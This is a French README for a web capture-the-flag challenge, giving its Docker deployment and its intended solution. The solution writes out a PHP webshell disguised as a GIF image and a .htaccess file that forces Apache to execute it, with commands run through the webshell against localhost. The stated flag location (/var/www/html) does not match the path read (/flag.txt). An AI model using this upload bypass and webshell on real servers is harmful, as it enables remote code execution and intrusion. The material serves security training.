# Challenge CTF WEB : Blog'N'Upload

**Difficulté :** Intermédiaire
**Compétence visée :** Upload de fichiers non sécurisé, contournement de filtres, exécution de code à distance (RCE)
**Contexte :** Site de blog avec fonctionnalité d'upload d'image de profil.

## Description du Challenge

Bienvenue sur "Blog'N'Upload", un nouveau site de blog où les utilisateurs peuvent s'inscrire, se connecter et personnaliser leur profil avec une image. Une vulnérabilité a été découverte dans le processus d'upload de ces images. Votre mission est de l'exploiter pour exécuter du code sur le serveur et récupérer le flag caché.

## Déploiement du Challenge

1.  **Prérequis :**
    * Docker
    * Docker Compose

2.  **Cloner le dépôt (ou dézipper l'archive) :**
    ```bash
    # Si c'est un dépôt Git
    git clone [https://github.com/votre_repo/blog-n-upload.git](https://github.com/votre_repo/blog-n-upload.git)
    cd blog-n-upload
    # Si c'est une archive ZIP, dézippez-la et naviguez dans le dossier
    ```

3.  **Construire et lancer le conteneur Docker :**
    ```bash
    docker-compose up --build -d
    ```
    * `--build` : Construit l'image Docker (nécessaire la première fois ou après des modifications du `Dockerfile`).
    * `-d` : Lance le conteneur en arrière-plan (detached mode).

4.  **Accéder au challenge :**
    Le challenge sera accessible dans votre navigateur à l'adresse : `http://localhost/`

## Solution Attendue (pour le créateur du challenge)

Le but est d'exploiter la fonctionnalité d'upload de fichiers pour exécuter un webshell PHP et lire le fichier `flag.txt` situé à la racine du dossier `/var/www/html` dans le conteneur (`app/flag.txt` sur votre machine hôte).

### Étapes de résolution :

1.  **Inscription et Connexion :**
    * Créez un compte sur `http://localhost/register.php`.
    * Connectez-vous avec ce compte sur `http://localhost/login.php`.

2.  **Analyse de l'Upload :**
    * Naviguez vers la page de profil (`http://localhost/profile.php`).
    * Tentez d'uploader une image normale (`.jpg`, `.png`). Notez où elle est stockée (ex: `http://localhost/uploads/votre_username/image.jpg`).
    * Tentez d'uploader un fichier PHP simple (ex: `shell.php` contenant `<?php phpinfo(); ?>`). Le serveur devrait refuser l'upload en raison du filtre d'extension (`Désolé, seuls les fichiers JPG, JPEG, PNG & GIF sont autorisés.`).

3.  **Préparation du Webshell et du `.htaccess` :**
    * Le serveur Apache est configuré avec `AllowOverride All` pour le répertoire `/var/www/html`, ce qui signifie qu'il interprétera les fichiers `.htaccess`.
    * Créez deux fichiers :
        * **`shell.jpg`** (ou n'importe quel nom d'image) :
            ```php
            GIF89a; # Magic bytes pour contourner une éventuelle vérification de type de fichier
            <?php system($_GET['cmd']); ?>
            ```
            Le `GIF89a;` est un "magic byte" qui fait croire au serveur (ou à des outils de vérification) que le fichier est un GIF valide, même s'il contient du code PHP.

        * **`.htaccess`** :
            ```apache
            <FilesMatch "shell\.jpg">
                SetHandler application/x-httpd-php
            </FilesMatch>
            ```
            Ce fichier `.htaccess` indique à Apache de traiter spécifiquement `shell.jpg` comme un fichier PHP exécutable.

4.  **Upload des fichiers :**
    * **Uploadez d'abord le fichier `.htaccess`** via la page de profil. Étant donné qu'il n'a pas d'extension "interdite" (ce n'est pas un `.php` ou similaire), le système de filtre simple ne le bloquera pas. Il sera placé dans `uploads/votre_username/`.
    * **Ensuite, uploadez le fichier `shell.jpg`** via la même page de profil. Il sera également placé dans `uploads/votre_username/`.

5.  **Exécution du Webshell et Récupération du Flag :**
    * Accédez à l'URL de votre webshell : `http://localhost/uploads/votre_username/shell.jpg`.
    * Ajoutez un paramètre `cmd` à l'URL pour exécuter des commandes :
        * `http://localhost/uploads/votre_username/shell.jpg?cmd=ls -la /` (Pour lister la racine)
        * Vous devriez voir `flag.txt` dans la liste.
        * `http://localhost/uploads/votre_username/shell.jpg?cmd=cat /flag.txt` (Pour lire le flag)

    Le flag sera affiché dans la page.

## Nettoyage

Pour arrêter et supprimer les conteneurs et les images :
```bash
docker-compose down --rmi all